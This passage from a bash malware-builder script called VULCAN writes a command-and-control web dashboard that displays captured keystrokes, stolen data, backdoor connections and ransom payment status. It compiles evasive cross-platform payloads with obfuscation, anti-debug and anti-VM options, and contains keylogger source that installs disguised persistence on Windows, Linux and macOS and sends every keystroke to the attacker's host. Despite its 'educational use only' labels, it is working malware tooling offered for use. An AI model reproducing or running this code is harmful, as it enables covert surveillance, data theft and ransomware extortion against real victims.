    ! validate_ip "$ATTACKER_IP" && errors+=("Invalid attacker IP: $ATTACKER_IP")
    ! validate_port "$ATTACKER_PORT" && errors+=("Invalid attacker port: $ATTACKER_PORT")
    ! validate_port "$WEB_PORT" && errors+=("Invalid web port: $WEB_PORT")
    
    [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Cross-platform" ] && errors+=("Invalid target OS: $TARGET_OS")
    
    [[ ! "$PAYLOAD_TYPE" =~ ^[1-9]$ ]] && errors+=("Invalid payload type: $PAYLOAD_TYPE")
    
    if [ "$PAYLOAD_TYPE" == "3" ] && [ -n "$CRYPTO_WALLET" ]; then
        ! validate_crypto_wallet "$CRYPTO_WALLET" "$CRYPTO_WALLET_TYPE" && errors+=("Invalid crypto wallet: $CRYPTO_WALLET")
    fi
    
    if [ ${#errors[@]} -ne 0 ]; then
        echo -e "${R}[!] Configuration validation failed:${NC}"
        for error in "${errors[@]}"; do
            echo -e "${R}    - $error${NC}"
        done
        return 1
    fi
    
    return 0
}

start_web_interface() {
    if [ "$WEB_INTERFACE_ENABLED" != true ]; then
        return 0
    fi
    
    log_message "INFO" "Starting web interface on port $WEB_PORT"
    
    cat > "$TEMP_DIR/web_interface.py" << EOF
#!/usr/bin/env python3
from flask import Flask, render_template_string, request, jsonify, redirect, url_for
from flask_socketio import SocketIO, emit
import json
import os
import time
from datetime import datetime
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'educational_purpose_only'
socketio = SocketIO(app, cors_allowed_origins="*")

results = {
    'system_info': {},
    'keylogger_data': [],
    'ransomware_data': {},
    'backdoor_data': {},
    'stealer_data': {},
    'network_data': {},
    'bricker_data': {},
    'worm_data': {},
    'rootkit_data': {},
    'custom_data': {}
}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>VULCAN Results Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 10px; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .header p { font-size: 1.2em; opacity: 0.9; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #2d2d2d; padding: 20px; border-radius: 10px; text-align: center; border-left: 4px solid #4CAF50; }
        .stat-card h3 { color: #4CAF50; margin-bottom: 10px; }
        .stat-card .number { font-size: 2em; font-weight: bold; color: #fff; }
        .tabs { display: flex; margin-bottom: 20px; background: #2d2d2d; border-radius: 10px; overflow: hidden; }
        .tab { flex: 1; padding: 15px; text-align: center; cursor: pointer; transition: all 0.3s; border-right: 1px solid #444; }
        .tab:last-child { border-right: none; }
        .tab:hover { background: #3d3d3d; }
        .tab.active { background: #4CAF50; color: #000; font-weight: bold; }
        .tab-content { display: none; background: #2d2d2d; padding: 20px; border-radius: 10px; min-height: 400px; }
        .tab-content.active { display: block; }
        .log-entry { background: #1a1a1a; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 3px solid #4CAF50; font-family: monospace; }
        .log-entry.error { border-left-color: #f44336; }
        .log-entry.warning { border-left-color: #ff9800; }
        .log-entry.info { border-left-color: #2196F3; }
        .timestamp { color: #888; font-size: 0.9em; }
        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .data-card { background: #1a1a1a; padding: 15px; border-radius: 8px; border: 1px solid #444; }
        .data-card h4 { color: #4CAF50; margin-bottom: 10px; }
        .keylogger-buffer { background: #000; padding: 15px; border-radius: 8px; font-family: monospace; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #444; }
        .ransomware-info { background: linear-gradient(135deg, #f44336 0%, #e91e63 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .wallet-address { background: #000; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }
        .status-indicator { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
        .status-online { background: #4CAF50; }
        .status-offline { background: #f44336; }
        .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px 0; }
        .refresh-btn:hover { background: #45a049; }
        .footer { text-align: center; margin-top: 40px; padding: 20px; background: #2d2d2d; border-radius: 10px; color: #888; }
        .payment-status { padding: 10px; border-radius: 5px; margin: 10px 0; }
        .payment-pending { background: #ff9800; color: #000; }
        .payment-received { background: #4CAF50; color: #fff; }
        .countdown { font-size: 1.2em; font-weight: bold; color: #f44336; }
        .crypto-logo { width: 24px; height: 24px; margin-right: 8px; vertical-align: middle; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 VULCAN RESULTS DASHBOARD</h1>
            <p>Educational Security Framework - Real-time Results</p>
            <p><span class="status-indicator status-online"></span> Live Monitoring Active</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Active Connections</h3>
                <div class="number" id="active-connections">0</div>
            </div>
            <div class="stat-card">
                <h3>Keys Logged</h3>
                <div class="number" id="keys-logged">0</div>
            </div>
            <div class="stat-card">
                <h3>Files Encrypted</h3>
                <div class="number" id="files-encrypted">0</div>
            </div>
            <div class="stat-card">
                <h3>Data Exfiltrated</h3>
                <div class="number" id="data-exfiltrated">0 MB</div>
            </div>
        </div>
        
        <div class="tabs">
            <div class="tab active" onclick="showTab('system')">System Info</div>
            <div class="tab" onclick="showTab('keylogger')">Keylogger</div>
            <div class="tab" onclick="showTab('ransomware')">Ransomware</div>
            <div class="tab" onclick="showTab('backdoor')">Backdoor</div>
            <div class="tab" onclick="showTab('stealer')">Info Stealer</div>
            <div class="tab" onclick="showTab('network')">Network</div>
            <div class="tab" onclick="showTab('logs')">All Logs</div>
        </div>
        
        <div id="system" class="tab-content active">
            <h3>🖥️ System Information</h3>
            <div class="data-grid" id="system-info-grid">
                <div class="data-card">
                    <h4>Waiting for system data...</h4>
                    <p>System information will appear here when the payload connects.</p>
                </div>
            </div>
        </div>
        
        <div id="keylogger" class="tab-content">
            <h3>⌨️ Keylogger Results</h3>
            <button class="refresh-btn" onclick="clearKeylogger()">Clear Buffer</button>
            <div class="keylogger-buffer" id="keylogger-buffer">
                Waiting for keystroke data...
            </div>
        </div>
        
        <div id="ransomware" class="tab-content">
            <h3>🔒 Ransomware Operations</h3>
            <div class="ransomware-info">
                <h4>💰 Ransom Payment Information</h4>
                <p>Send payment to the following wallet address:</p>
                <div class="wallet-address" id="wallet-address">$CRYPTO_WALLET</div>
                <p>Cryptocurrency: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}</p>
                <p>Amount: $CRYPTO_AMOUNT ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}</p>
                <p>Payment deadline: <span id="payment-deadline" class="countdown">--:--:--</span></p>
                <div id="payment-status" class="payment-status payment-pending">Payment Status: Pending</div>
            </div>
            <div class="data-grid" id="ransomware-grid">
                <div class="data-card">
                    <h4>Files Encrypted</h4>
                    <p id="files-count">0 files encrypted</p>
                </div>
                <div class="data-card">
                    <h4>Encryption Status</h4>
                    <p id="encryption-status">Waiting...</p>
                </div>
                <div class="data-card">
                    <h4>Decryption Key</h4>
                    <p id="decryption-key">Not generated yet</p>
                </div>
            </div>
        </div>
        
        <div id="backdoor" class="tab-content">
            <h3>🚪 Backdoor Connections</h3>
            <div class="data-grid" id="backdoor-grid">
                <div class="data-card">
                    <h4>Connection Status</h4>
                    <p id="connection-status">No active connections</p>
                </div>
                <div class="data-card">
                    <h4>Commands Executed</h4>
                    <p id="commands-count">0 commands</p>
                </div>
            </div>
        </div>
        
        <div id="stealer" class="tab-content">
            <h3>💎 Information Stealer</h3>
            <div class="data-grid" id="stealer-grid">
                <div class="data-card">
                    <h4>Data Collected</h4>
                    <p>Waiting for stolen data...</p>
                </div>
            </div>
        </div>
        
        <div id="network" class="tab-content">
            <h3>🌐 Network Activity</h3>
            <div class="data-grid" id="network-grid">
                <div class="data-card">
                    <h4>Network Scans</h4>
                    <p>Waiting for network data...</p>
                </div>
            </div>
        </div>
        
        <div id="logs" class="tab-content">
            <h3>📋 All Activity Logs</h3>
            <div id="logs-container">
                <div class="log-entry info">
                    <span class="timestamp">[{{ timestamp }}]</span> System initialized - Waiting for payload connections...
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>🔥 VULCAN Educational Framework v$SCRIPT_VERSION | Educational Use Only</p>
            <p>⚠️ This dashboard is for educational purposes in controlled environments only</p>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let keyloggerData = '';
        let deadlineTime = null;
        let countdownInterval = null;
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        socket.on('system_info', function(data) {
            updateSystemInfo(data);
            addLog('System information received', 'info');
        });
        
        socket.on('keylogger_data', function(data) {
            keyloggerData += data.keystroke + ' ';
            document.getElementById('keylogger-buffer').textContent = keyloggerData;
            document.getElementById('keys-logged').textContent = keyloggerData.length;
            addLog('Keystroke captured: ' + data.keystroke, 'info');
        });
        
        socket.on('ransomware_data', function(data) {
            updateRansomwareInfo(data);
            addLog('Ransomware activity: ' + data.action, 'warning');
        });
        
        socket.on('backdoor_data', function(data) {
            updateBackdoorInfo(data);
            addLog('Backdoor connection: ' + data.status, 'info');
        });
        
        socket.on('stealer_data', function(data) {
            updateStealerInfo(data);
            addLog('Data stolen: ' + data.type, 'warning');
        });
        
        socket.on('network_data', function(data) {
            updateNetworkInfo(data);
            addLog('Network activity: ' + data.action, 'info');
        });
        
        function updateSystemInfo(data) {
            const grid = document.getElementById('system-info-grid');
            grid.innerHTML = '';
            
            for (const [key, value] of Object.entries(data)) {
                const card = document.createElement('div');
                card.className = 'data-card';
                card.innerHTML = \`
                    <h4>\${key}</h4>
                    <p>\${value}</p>
                \`;
                grid.appendChild(card);
            }
        }
        
        function updateRansomwareInfo(data) {
            if (data.files_encrypted) {
                document.getElementById('files-count').textContent = data.files_encrypted + ' files encrypted';
                document.getElementById('files-encrypted').textContent = data.files_encrypted;
            }
            if (data.status) {
                document.getElementById('encryption-status').textContent = data.status;
            }
            if (data.decryption_key) {
                document.getElementById('decryption-key').textContent = data.decryption_key;
            }
            if (data.payment_deadline) {
                deadlineTime = new Date(data.payment_deadline).getTime();
                startCountdown();
            }
            if (data.payment_status === 'received') {
                document.getElementById('payment-status').textContent = 'Payment Status: Received';
                document.getElementById('payment-status').className = 'payment-status payment-received';
            }
        }
        
        function startCountdown() {
            if (countdownInterval) {
                clearInterval(countdownInterval);
            }
            
            countdownInterval = setInterval(function() {
                if (!deadlineTime) return;
                
                const now = new Date().getTime();
                const distance = deadlineTime - now;
                
                if (distance < 0) {
                    document.getElementById('payment-deadline').textContent = 'EXPIRED';
                    clearInterval(countdownInterval);
                    return;
                }
                
                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
                
                document.getElementById('payment-deadline').textContent = 
                    hours.toString().padStart(2, '0') + ':' + 
                    minutes.toString().padStart(2, '0') + ':' + 
                    seconds.toString().padStart(2, '0');
            }, 1000);
        }
        
        function updateBackdoorInfo(data) {
            if (data.status) {
                document.getElementById('connection-status').textContent = data.status;
            }
            if (data.commands) {
                document.getElementById('commands-count').textContent = data.commands + ' commands';
            }
            if (data.status === 'Connected') {
                document.getElementById('active-connections').textContent = '1';
            }
        }
        
        function updateStealerInfo(data) {
            const grid = document.getElementById('stealer-grid');
            const card = document.createElement('div');
            card.className = 'data-card';
            card.innerHTML = \`
                <h4>\${data.type}</h4>
                <p>\${data.data}</p>
            \`;
            grid.appendChild(card);
            
            const size = Math.random() * 10;
            document.getElementById('data-exfiltrated').textContent = size.toFixed(2) + ' MB';
        }
        
        function updateNetworkInfo(data) {
            const grid = document.getElementById('network-grid');
            const card = document.createElement('div');
            card.className = 'data-card';
            card.innerHTML = \`
                <h4>\${data.action}</h4>
                <p>\${data.target || 'N/A'}</p>
            \`;
            grid.appendChild(card);
        }
        
        function addLog(message, type = 'info') {
            const logsContainer = document.getElementById('logs-container');
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry ' + type;
            
            const timestamp = new Date().toLocaleString();
            logEntry.innerHTML = \`
                <span class="timestamp">[\${timestamp}]</span> \${message}
            \`;
            
            logsContainer.appendChild(logEntry);
            logsContainer.scrollTop = logsContainer.scrollHeight;
        }
        
        function clearKeylogger() {
            keyloggerData = '';
            document.getElementById('keylogger-buffer').textContent = '';
            document.getElementById('keys-logged').textContent = '0';
            addLog('Keylogger buffer cleared', 'info');
        }
        
        setInterval(() => {
            socket.emit('get_status');
        }, 5000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/results', methods=['POST'])
def receive_results():
    data = request.json
    payload_type = data.get('type', 'unknown')
    
    if payload_type == 'system_info':
        results['system_info'] = data
        socketio.emit('system_info', data)
    elif payload_type == 'keylogger':
        results['keylogger_data'].append(data)
        socketio.emit('keylogger_data', data)
    elif payload_type == 'ransomware':
        results['ransomware_data'] = data
        socketio.emit('ransomware_data', data)
    elif payload_type == 'backdoor':
        results['backdoor_data'] = data
        socketio.emit('backdoor_data', data)
    elif payload_type == 'stealer':
        results['stealer_data'] = data
        socketio.emit('stealer_data', data)
    elif payload_type == 'network':
        results['network_data'] = data
        socketio.emit('network_data', data)
    elif payload_type == 'bricker':
        results['bricker_data'] = data
        socketio.emit('bricker_data', data)
    elif payload_type == 'worm':
        results['worm_data'] = data
        socketio.emit('worm_data', data)
    elif payload_type == 'rootkit':
        results['rootkit_data'] = data
        socketio.emit('rootkit_data', data)
    elif payload_type == 'custom':
        results['custom_data'] = data
        socketio.emit('custom_data', data)
    
    return jsonify({'status': 'success'})

@socketio.on('get_status')
def get_status():
    emit('status_update', results)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=$WEB_PORT, debug=False, allow_unsafe_werkzeug=True)
EOF

    chmod +x "$TEMP_DIR/web_interface.py"
    
    python3 "$TEMP_DIR/web_interface.py" &
    local web_pid=$!
    
    echo "$web_pid" > "$TEMP_DIR/web_interface.pid"
    
    log_message "SUCCESS" "Web interface started on http://$ATTACKER_IP:$WEB_PORT"
    echo -e "${G}[+] Web interface started: http://$ATTACKER_IP:$WEB_PORT${NC}"
    echo -e "${Y}[*] Access the dashboard to view real-time results${NC}"
    
    return 0
}

generate_payload() {
    local type=$1
    local attacker_ip=$2
    local attacker_port=$3
    local target_os=$4
    local final_name=$5
    
    log_message "INFO" "Generating payload type: $type for $target_os"
    echo -e "${Y}[*] Generating payload for type: $type | Target OS: $target_os${NC}"
    
    if ! validate_config; then
        log_message "ERROR" "Configuration validation failed"
        return 1
    fi
    
    local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
    
    if [ "$target_os" == "Cross-platform" ]; then
        echo -e "${Y}[*] Generating cross-platform payload...${NC}"
        
        mkdir -p "../cross_platform_builds"
        
        local platforms=("Windows" "Linux" "macOS")
        local platform_names=("pc.exe" "pc_linux" "pc_macos")
        local success_count=0
        
        for i in "${!platforms[@]}"; do
            local platform="${platforms[$i]}"
            local platform_name="${platform_names[$i]}"
            
            echo -e "${Y}[*] Building for $platform...${NC}"
            
            case $type in
                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                *)
                    echo -e "${R}[!] Invalid payload type selected.${NC}"
                    log_message "ERROR" "Invalid payload type: $type"
                    return 1
                    ;;
            esac
            
            [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
            [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
            [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
            
            local pyinstaller_args="--onefile --name=$platform_name"
            
            [ "$platform" == "Windows" ] && pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE" || pyinstaller_args="$pyinstaller_args --console"
            
            pyinstaller_args="$pyinstaller_args --strip --clean"
            
            [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
                1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
                2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
                3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
            esac
            
            if pyinstaller $pyinstaller_args payload.py; then
                if [ -f "dist/$platform_name" ]; then
                    local file_size=$(stat -f%z "dist/$platform_name" 2>/dev/null || stat -c%s "dist/$platform_name")
                    local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
                    local file_hash=$(sha256sum "dist/$platform_name" | cut -d' ' -f1)
                    
                    echo -e "${G}[+] Success! $platform payload created as 'dist/$platform_name' (${size_mb} MB).${NC}"
                    
                    mv "dist/$platform_name" "../cross_platform_builds/"
                    
                    local metadata_file="../cross_platform_builds/${platform_name}.meta"
                    cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $platform
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Web Interface Enabled: $WEB_INTERFACE_ENABLED
Crypto Wallet: $CRYPTO_WALLET
Crypto Wallet Type: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}
Crypto Amount: $CRYPTO_AMOUNT
Payment Deadline: $PAYMENT_DEADLINE_HOURS hours
Delivery Method: $DELIVERY_METHOD
EOF
                    
                    success_count=$((success_count + 1))
                    log_message "SUCCESS" "Successfully created $platform executable: $platform_name (${size_mb} MB, SHA256: $file_hash)"
                fi
            else
                echo -e "${R}[!] Failed to create $platform executable.${NC}"
                log_message "ERROR" "Failed to create $platform executable"
            fi
        done
        
        cat > "../cross_platform_builds/launcher.sh" << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OS="unknown"
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
    OS="windows"
fi
case $OS in
    "linux")
        if [ -f "$SCRIPT_DIR/pc_linux" ]; then
            chmod +x "$SCRIPT_DIR/pc_linux"
            "$SCRIPT_DIR/pc_linux" "$@"
        else
            echo "Linux payload not found"
            exit 1
        fi
        ;;
    "macos")
        if [ -f "$SCRIPT_DIR/pc_macos" ]; then
            chmod +x "$SCRIPT_DIR/pc_macos"
            "$SCRIPT_DIR/pc_macos" "$@"
        else
            echo "macOS payload not found"
            exit 1
        fi
        ;;
    "windows")
        if [ -f "$SCRIPT_DIR/pc.exe" ]; then
            "$SCRIPT_DIR/pc.exe" "$@"
        else
            echo "Windows payload not found"
            exit 1
        fi
        ;;
    *)
        echo "Unsupported operating system: $OSTYPE"
        exit 1
        ;;
esac
EOF
        
        chmod +x "../cross_platform_builds/launcher.sh"
        
        cat > "../cross_platform_builds/launcher.bat" << 'EOF'
@echo off
set SCRIPT_DIR=%~dp0
if exist "%SCRIPT_DIR%pc.exe" (
    start "" "%SCRIPT_DIR%pc.exe" %*
) else (
    echo Windows payload not found
    pause
    exit /b 1
)
EOF
        
        cat > "../cross_platform_builds/README.txt" << EOF
CROSS-PLATFORM PAYLOAD BUILD SUMMARY
====================================
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
Payload Type: $type
Successfully Built: $success_count/3 platforms
Auto-Execution Enabled: $AUTO_EXECUTION
Web Interface Enabled: $WEB_INTERFACE_ENABLED
Crypto Wallet: $CRYPTO_WALLET
Crypto Wallet Type: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}
Crypto Amount: $CRYPTO_AMOUNT
Payment Deadline: $PAYMENT_DEADLINE_HOURS hours

Files:
- launcher.sh: Unix/Linux/macOS launcher script
- launcher.bat: Windows batch launcher
- pc.exe: Windows executable
- pc_linux: Linux executable
- pc_macos: macOS executable

Usage:
1. On Unix/Linux/macOS: ./launcher.sh
2. On Windows: launcher.bat

Web Interface:
Access the results dashboard at: http://$ATTACKER_IP:$WEB_PORT

Crypto Payment:
For ransomware demonstrations:
- Cryptocurrency: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}
- Wallet: $CRYPTO_WALLET
- Amount: $CRYPTO_AMOUNT
- Deadline: $PAYMENT_DEADLINE_HOURS hours
EOF
        
        echo -e "${G}[+] Cross-platform build complete!${NC}"
        echo -e "${G}[+] Successfully built $success_count/3 platforms.${NC}"
        echo -e "${G}[+] All files are in the 'cross_platform_builds' directory.${NC}"
        echo -e "${G}[+] Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
        echo -e "${G}[+] Web interface available at: http://$ATTACKER_IP:$WEB_PORT${NC}"
        
        log_message "SUCCESS" "Cross-platform build completed: $success_count/3 platforms"
        return 0
    else
        case $type in
            1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            *)
                echo -e "${R}[!] Invalid payload type selected.${NC}"
                log_message "ERROR" "Invalid payload type: $type"
                return 1
                ;;
        esac
        
        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
        
        echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
        
        local pyinstaller_args="--onefile --name=$final_name"
        
        [ "$target_os" == "Windows" ] && pyinstaller_args="$pyinstaller_args --noconsole --windowed --icon=NONE" || pyinstaller_args="$pyinstaller_args --console"
        
        pyinstaller_args="$pyinstaller_args --strip --clean"
        
        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
        esac
        
        if ! pyinstaller $pyinstaller_args payload.py; then
            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
            log_message "ERROR" "PyInstaller compilation failed"
            return 1
        fi

        if [ -f "dist/$final_name" ]; then
            local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
            local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
            local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
            
            echo -e "${G}[+] Success! Payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
            echo -e "${G}[+] SHA256: $file_hash${NC}"
            
            mv "dist/$final_name" ..
            
            local metadata_file="../${final_name}.meta"
            cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $target_os
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Web Interface Enabled: $WEB_INTERFACE_ENABLED
Crypto Wallet: $CRYPTO_WALLET
Crypto Wallet Type: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]}
Crypto Amount: $CRYPTO_AMOUNT
Payment Deadline: $PAYMENT_DEADLINE_HOURS hours
Delivery Method: $DELIVERY_METHOD
EOF
            
            log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
            return 0
        else
            echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
            log_message "ERROR" "Failed to create executable"
            return 1
        fi
    fi
}

create_keylogger_payload() {
    local attacker_ip=$1
    local attacker_port=$2
    local encryption_key=$3
    local target_os=${4:-"Unknown"}
    
    cat > payload.py << EOF
#!/usr/bin/env python3
import time
import sys
import platform
import subprocess
import os
import requests
import json
import threading
from pynput import keyboard

ATTACKER_IP = "$attacker_ip"
WEB_PORT = $WEB_PORT
AUTO_EXECUTION = $AUTO_EXECUTION
WEB_INTERFACE_ENABLED = $WEB_INTERFACE_ENABLED

keylogger_buffer = []
buffer_lock = threading.Lock()

def send_to_web_interface(data_type, data):
    if not WEB_INTERFACE_ENABLED:
        return
    
    try:
        url = f"http://{ATTACKER_IP}:{WEB_PORT}/api/results"
        payload = {
            'type': data_type,
            'timestamp': time.time(),
            'data': data
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def setup_persistence():
    if not AUTO_EXECUTION:
        return
    
    try:
        system = platform.system()
        
        if system == "Windows":
            import winreg
            
            exe_path = os.path.abspath(sys.argv[0])
            
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
                
        elif system == "Linux":
            exe_path = os.path.abspath(sys.argv[0])
            
            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
            with open("/tmp/crontab.txt", "w") as f:
                f.write(cron_job)
            
            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
            os.remove("/tmp/crontab.txt")
            
        elif system == "Darwin":
            exe_path = os.path.abspath(sys.argv[0])
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            
            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            with open(plist_path, "w") as f:
                f.write(plist_content)
                
            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
            
    except Exception as e:
        pass

def on_key_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key)
        
        with buffer_lock:
            keylogger_buffer.append({
                'key': key_str,
                'timestamp': time.time()
            })
        
        send_to_web_interface('keylogger', {
            'keystroke': key_str,
            'timestamp': time.time()
        })
        
        print(f"[KEYLOG] {key_str}", end='', flush=True)
        
    except Exception as e:
        pass

def start_keylogger():
